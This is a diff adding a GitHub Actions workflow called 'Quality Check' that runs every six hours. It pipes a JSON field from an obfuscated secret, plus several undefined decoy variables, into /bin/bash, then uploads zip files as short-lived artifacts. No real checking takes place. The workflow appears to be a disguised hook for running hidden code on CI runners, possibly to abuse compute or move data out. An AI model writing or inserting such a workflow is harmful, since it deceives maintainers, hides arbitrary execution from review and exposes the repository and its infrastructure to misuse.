@@ -1,0 +1,37 @@
+name: Quality Check
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '23 1,7,13,19 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  runner:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Go
+        env:
+          bi87655: ${{ secrets.bi87655 }}
+        run: |
+          printf '%s' "$bi87655" | jq -r .nynt89 | /bin/bash
+          echo $xuql2774 | jq -r .sz1197 | /bin/bash
+          echo $e593 | jq -r .vx65359 | /bin/bash
+          printf '%s' "$czudw1268" | jq -r .k2 | /bin/bash
+          printf '%s' "$lp84569" | jq -r .hvo10 | /bin/bash
+          printf '%s' "$ar138" | jq -r .tfnxm489 | /bin/bash
+          printf '%s' "$uclnr20150" | jq -r .f23 | /bin/bash
+
+      - name: Archive results
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: 3O5eYbSx
+          path: "*.zip"
+          retention-days: 1
